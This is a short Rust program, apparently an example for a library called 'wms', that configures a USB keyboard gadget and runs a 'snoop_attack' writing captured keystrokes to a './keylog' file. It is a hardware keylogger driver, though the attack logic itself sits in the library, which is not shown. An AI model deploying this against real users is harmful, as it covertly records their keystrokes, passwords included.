use usb_gadget;
use wms::{Attack, InputAttack, SnoopAttack, WMSError};

fn main() -> Result<(), wms::WMSError> {
    usb_gadget::remove_all().expect("Could not remove USB gadgets");
    let mut kybd = wms::WMSKeyboardDevice::new();
    let reg_gadget = kybd.setup_gadget()?;
    kybd.open_logfile("./keylog");
    kybd.snoop_attack()?;
    Ok(())
}
